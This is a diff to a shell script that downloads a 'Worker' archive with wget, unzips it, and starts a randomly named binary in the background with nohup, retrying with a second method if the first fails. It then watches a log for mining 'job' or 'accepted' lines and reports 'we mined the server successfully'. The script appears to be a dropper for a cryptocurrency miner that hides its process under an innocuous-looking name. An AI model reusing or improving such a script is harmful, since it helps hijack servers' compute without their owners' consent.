@@ -29,18 +29,24 @@ case $1 in
 esac
 
 # Download the file
+echo "Downloading the Worker $1"
 wget $URL -O kwarta.zip
 if [ $? -ne 0 ]; then
   echo "Download failed. Please check the URL or your internet connection."
   exit 1
+else
+  echo "Download Complete."
 fi
 
 # Unzip the downloaded file
+echo "Unzipping the file"
 unzip kwarta.zip
 if [ $? -ne 0 ]; then
-  echo "Unzipping failed. The file may be corrupted."
+  echo "Unzipping failed."
   rm -rf kwarta.zip
   exit 1
+else
+  echo "Unzipping Complete."
 fi
 
 # Remove the zip file
@@ -66,7 +72,7 @@ nohup ./session_ajqysbey 2>&1 &
 PID=$!
 
 # Wait for a moment to check if the process is still running
-sleep 2
+sleep 3
 
 # Check if the process is running
 if ps -p $PID > /dev/null; then
@@ -77,7 +83,7 @@ else
   # Try an alternate method to run in the background
   ./session_ajqysbey 2>&1 &
   PID=$!
-  sleep 2
+  sleep 3
 
   if ps -p $PID > /dev/null; then
     echo "Process started successfully with alternate method with PID $PID."
@@ -91,7 +97,7 @@ fi
 check_log() {
   while true; do
     if grep -q "job" "$LOG_FILE" || grep -q "accepted" "$LOG_FILE"; then
-      echo "Found 'job' or 'accept' in log file. Exiting script."
+      echo "Found 'job' we mined the server successfully"
       exit 0
     else
       echo "No Job found yet this time!"
